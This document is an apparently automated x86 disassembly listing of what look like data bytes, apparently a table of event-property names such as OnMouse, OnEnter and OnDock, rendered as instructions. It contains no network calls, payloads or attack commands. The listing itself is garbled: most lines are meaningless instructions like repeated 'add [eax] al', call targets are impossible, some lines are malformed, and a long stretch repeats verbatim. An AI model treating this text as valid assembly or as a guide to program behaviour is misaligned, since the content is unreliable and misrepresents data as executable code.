add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
add al 0xc
inc ebp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
jo r-xdata
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
add [ eax - 0x5d ] ch
inc ecx
add al ch
fld [ eax + eax + 0x4 ]
jb r-xdata
outsd
jne r-xdata
add [ eax ] al
sub [ 0x6e4f0900 ] 0x4d
pop edi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor [ ecx ] 0x0
jb r-xdata
call 0xffffffffd845044a
add [ eax ] al
outsb
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
pop esp
sbb al [ edx ]
inc eax
xor al 0x40
je r-xdata
jl r-xdata
inc esp
jb r-xdata
inc ebp
outsb
outsb
dec ebp
outsd
jne r-xdata
add [ cs : edi + ecx * 2 ] cl
pop edi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
add [ eax ] cl
or al 0x45
outsb
push cs
dec edi
pop edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
rcl [ ebp + eax * 2 + 0x44e67c00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ eax - 0x23 ] ah
inc esp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax - 0x18 ] bl
inc esp
add [ eax ] dl
fiadd [ eax + eax + 0x3c ]
fiadd [ eax + eax + 0x6c ]
call 0xffffffffdd78c2a2
inc esp
add [ edi - 0x185fffbc ] dl
inc esp
add [ eax + ebp * 8 ] ch
inc esp
add [ ebx + edx ] ah
inc esi
add [ ebp + ebx * 8 - 0x194bffbc ] al
inc esp
add [ eax ] bh
loopne r-xdata
add [ edi * 2 + 0x581c0045 ] al
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebx ] dl
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ eax + 0x48004213 ] dh
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
mov [ 0xffffffffa8f00041 ] eax
inc ecx
add [ edx + ebx * 8 + 0x44 ] bh
mov esp 0xe4004194
add [ edx + ebp * 4 - 0x54ebffbf ] cl
inc ecx
add [ eax + 0x80044db ] dh
lodsd [ esi ]
inc ecx
add ah bl
sahf
inc ecx
add [ eax ] al
lahf
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add al bh
fiadd [ eax + eax + 0x68 ]
fild [ eax + eax - 0x80 ]
mov [ 0xffffffffa3740041 ] al
inc ecx
add [ eax + 0x80044db ] cl
cmpsb [ esi ] [ edi ]
inc ecx
add ah bl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] ah
sub al [ eax ]
adc [ edi - 0x58bfffbf ] ah
inc ecx
add [ edi - 0x57bfffbf ] dl
inc ecx
add al bl
test eax 0xaa300041
inc ecx
add ah al
stosb [ edi ]
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
inc esp
fiadd [ eax + eax - 0x38 ]
call 0x445055e
mov al [ 0xffffffff9fdc0041 ]
insb
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ esi + ebx * 8 - 0x214bffbc ] ch
inc esp
add [ esi + ebx * 8 - 0x213bffbc ] bh
inc esp
add [ eax + 0x500044e5 ] dl
out 0x44 al
add [ ebp - 0x19cfffbc ] dh
inc esp
add ah bh
in eax 0x44
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax - 0x22 ] bh
inc esp
add [ eax ] ah
sub al [ eax ]
call 0xffffffffe7b4c2d6
inc esp
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x44de88ff ]
add al ch
fiadd [ eax + eax - 0x4 ]
fiadd [ eax + eax + 0x24 ]
in al 0x44
add [ eax ] al
add [ eax ] al
xchg esp eax
retn 0x44
je r-xdata
rol [ eax + eax + 0x14 ] 0x0
add [ eax ] al
test al 0x6a
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
dec esp
popad
jbe r-xdata
test [ ecx ] dh
inc eax
add [ eax + 0x48004031 ] ah
sbb eax [ edx ]
je r-xdata
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
imul ebp [ esi + 0x67 ] 0xc1089073
inc esp
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
les ecx [ 0x1000045 ]
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add ah al
call 0x1bc0c3b2
inc edx
add [ eax - 0x4fffbab7 ] dh
sbb eax [ edx ]
pop esp
dec edx
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c4505a4
dec eax
inc ebp
add al ch
call 0x4954c3d6
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ eax ] ah
jmp 0x4a3cc402
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add al bh
retn 0x44
fadd [ eax + eax + 0x54 ]
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
je r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esi + ebx * 4 - 0x6b43ffbf ] ch
inc ecx
add ah ah
xor al 0x40
jb r-xdata
add al bl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ecx
add [ eax + 0x680044da ] ah
mov [ 0xffffffffd9e80041 ] eax
inc esp
add [ edx + ebx * 8 ] al
inc esp
add al cl
inc ecx
add [ esp + edx * 4 - 0x5f1bffbf ] bh
inc ecx
add ah bl
lahf
adc eax [ edx ]
dec eax
je r-xdata
inc ecx
add ah dl
in eax 0x44
imul ebp [ esi + 0x67 ] 0x44c06c73
add [ eax + 0x416b ] dl
add [ eax ] cl
push ebx
je r-xdata
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
inc esp
inc ebx
je r-xdata
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add ah ah
fild [ eax + eax + 0x68 ]
leave
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
insb
jae r-xdata
add [ ebp - 0x3e7bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
retn 0x44
sub_44b990
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 4 + 0x44 ] ch
add [ eax + 0x48000001 ] dl
mov eax 0x1a5c0044
inc edx
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax + 0x6e ] ah
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add al ah
aad 0x45
add [ eax + 0x7b ] al
inc ebp
add [ eax ] bh
outsd
inc ebp
inc eax
add [ eax - 0x1fffbfcf ] ah
outsd
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
push 0x70044b9
or al 0x54
inc ebx
jne r-xdata
js r-xdata
add [ edi * 2 - 0x283fffbb ] al
xchg ebx eax
inc ecx
add [ eax - 0x5fffbb2a ] bh
fadd [ eax + eax - 0x78 ]
je r-xdata
inc esp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add ah cl
insb
inc ebp
add [ eax + 0x2000457d ] cl
pop edi
inc ebp
add [ edi + ebx * 2 + 0x50080045 ] dl
inc ebp
add [ edi + ebx * 2 + 0x45 ] dh
add [ ebp + edx * 8 - 0x2bc7ffbc ] bh
inc esp
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
add al 0x7d
inc ebp
add al al
xlat
inc esp
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
fdivr [ ecx - 0x469bffbc ]
inc esp
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
add al bl
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
xchg esp eax
mov eax 0x1ca80044
inc ebp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
dec esi
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
mov al [ 0xffffffff880044d8 ]
inc ebx
je r-xdata
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax - 0x2fffbb2d ] ah
imul eax [ ebp ] sub_4569cc
pushfd
push 0x45
add [ eax - 0x2bffbab3 ] dl
push esp
inc ebp
add [ eax ] bh
push esp
inc ebp
add [ eax + 0x5d ] ah
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
pop ss
inc edx
insb
jae r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x7a86564
or [ ebp ] al
inc ebp
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
movsb [ edi ] [ esi ]
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
dec esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
add al bl
add [ ebp ] al
pop ebx
add [ eax ] al
jmp [ eax + 0x4f ]
add [ eax + r-xdata ] dl
add bh bh
fwait
imul ebp [ edi + 0x6e ] sub_422998
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
je r-xdata
inc ebp
add [ edx + ebx * 2 + 0x45 ] cl
add [ edx + ebx * 2 + 0x45 ] bh
add [ eax + 0x7a ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
pop es
add bh bh
in al dx
pop ebx
inc ebp
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x4500c073
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jae r-xdata
add bh bh
call 0x145011a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
outsd
insb
cmp [ esi ] ch
inc edx
add [ eax ] ch
add bh bh
inc eax
pop ebx
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add [ esi ] dl
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov [ ebx ] ds
inc ebp
add [ eax + 0x1 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
sbb [ 0x6f500900 ] 0x70
jne r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
jb r-xdata
dec ebp
add [ eax + 0x1 ] al
outsb
je r-xdata
jb r-xdata
outsb
adc [ eax ] al
jo r-xdata
adc [ eax ] al
fcom st7
inc esp
add [ eax ] bl
fadd [ eax + eax - 0x78 ]
add [ eax ] eax
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
jo r-xdata
fadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
mov eax 0x16e0044
add bh bh
pop esp
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
add bh bh
cld
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
pop edi
inc ecx
add [ eax ] ah
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
push edi
add [ eax ] eax
jmp [ eax ]
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
jo r-xdata
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
insb
pop ecx
inc ebp
add al cl
jpe r-xdata
inc eax
add [ ecx - 0x63010000 ] bl
pop ebx
inc ebp
add [ ebx + ebx * 2 + 0x45 ] ah
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push ebp
jo r-xdata
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
add al dl
add [ eax ] al
call eax
add [ eax ] al
je r-xdata
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe943be8d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
insb
inc ebx
insb
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
add al 0xc
inc ebp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
jo r-xdata
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
add [ eax - 0x5d ] ch
inc ecx
add al ch
fld [ eax + eax + 0x4 ]
jb r-xdata
outsd
jne r-xdata
add [ eax ] al
sub [ 0x6e4f0900 ] 0x4d
pop edi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor [ ecx ] 0x0
jb r-xdata
call 0xffffffffd845044a
add [ eax ] al
outsb
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
pop esp
sbb al [ edx ]
inc eax
xor al 0x40
je r-xdata
jl r-xdata
inc esp
jb r-xdata
inc ebp
outsb
outsb
dec ebp
outsd
jne r-xdata
add [ cs : edi + ecx * 2 ] cl
pop edi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
add [ eax ] cl
or al 0x45
outsb
push cs
dec edi
pop edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
rcl [ ebp + eax * 2 + 0x44e67c00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ eax - 0x23 ] ah
inc esp
add ah ah
xchg esi eax
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax - 0x18 ] bl
inc esp
add [ eax ] dl
fiadd [ eax + eax + 0x3c ]
fiadd [ eax + eax + 0x6c ]
call 0xffffffffdd78c2a2
inc esp
add [ edi - 0x185fffbc ] dl
inc esp
add [ eax + ebp * 8 ] ch
inc esp
add [ ebx + edx ] ah
inc esi
add [ ebp + ebx * 8 - 0x194bffbc ] al
inc esp
add [ eax ] bh
loopne r-xdata
add [ edi * 2 + 0x581c0045 ] al
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add [ ebx ] dl
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ eax + 0x48004213 ] dh
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
mov [ 0xffffffffa8f00041 ] eax
inc ecx
add [ edx + ebx * 8 + 0x44 ] bh
mov esp 0xe4004194
add [ edx + ebp * 4 - 0x54ebffbf ] cl
inc ecx
add [ eax + 0x80044db ] dh
lodsd [ esi ]
inc ecx
add ah bl
sahf
inc ecx
add [ eax ] al
lahf
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add al bh
fiadd [ eax + eax + 0x68 ]
fild [ eax + eax - 0x80 ]
mov [ 0xffffffffa3740041 ] al
inc ecx
add [ eax + 0x80044db ] cl
cmpsb [ esi ] [ edi ]
inc ecx
add ah bl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax ] ah
sub al [ eax ]
adc [ edi - 0x58bfffbf ] ah
inc ecx
add [ edi - 0x57bfffbf ] dl
inc ecx
add al bl
test eax 0xaa300041
inc ecx
add ah al
stosb [ edi ]
inc ecx
add [ esi ] dl
push esp
inc ebx
jne r-xdata
inc esp
fiadd [ eax + eax - 0x38 ]
call 0x445055e
mov al [ 0xffffffff9fdc0041 ]
insb
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ esi + ebx * 8 - 0x214bffbc ] ch
inc esp
add [ esi + ebx * 8 - 0x213bffbc ] bh
inc esp
add [ eax + 0x500044e5 ] dl
out 0x44 al
add [ ebp - 0x19cfffbc ] dh
inc esp
add ah bh
in eax 0x44
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax - 0x22 ] bh
inc esp
add [ eax ] ah
sub al [ eax ]
call 0xffffffffe7b4c2d6
inc esp
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x44de88ff ]
add al ch
fiadd [ eax + eax - 0x4 ]
fiadd [ eax + eax + 0x24 ]
in al 0x44
add [ eax ] al
add [ eax ] al
xchg esp eax
retn 0x44
je r-xdata
rol [ eax + eax + 0x14 ] 0x0
add [ eax ] al
test al 0x6a
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
dec esp
popad
jbe r-xdata
test [ ecx ] dh
inc eax
add [ eax + 0x48004031 ] ah
sbb eax [ edx ]
je r-xdata
xor al 0x40
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
imul ebp [ esi + 0x67 ] 0xc1089073
inc esp
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
les ecx [ 0x1000045 ]
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add ah al
call 0x1bc0c3b2
inc edx
add [ eax - 0x4fffbab7 ] dh
sbb eax [ edx ]
pop esp
dec edx
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c4505a4
dec eax
inc ebp
add al ch
call 0x4954c3d6
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ eax ] ah
jmp 0x4a3cc402
insd
inc ebx
outsd
insd
bound ebp [ edi - 0x73 ]
inc eax
add al bh
retn 0x44
fadd [ eax + eax + 0x54 ]
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
je r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esi + ebx * 4 - 0x6b43ffbf ] ch
inc ecx
add ah ah
xor al 0x40
jb r-xdata
add al bl
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ecx
add [ eax + 0x680044da ] ah
mov [ 0xffffffffd9e80041 ] eax
inc esp
add [ edx + ebx * 8 ] al
inc esp
add al cl
inc ecx
add [ esp + edx * 4 - 0x5f1bffbf ] bh
inc ecx
add ah bl
lahf
adc eax [ edx ]
dec eax
je r-xdata
inc ecx
add ah dl
in eax 0x44
imul ebp [ esi + 0x67 ] 0x44c06c73
add [ eax + 0x416b ] dl
add [ eax ] cl
push ebx
je r-xdata
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
inc esp
inc ebx
je r-xdata
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add ah ah
fild [ eax + eax + 0x68 ]
leave
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
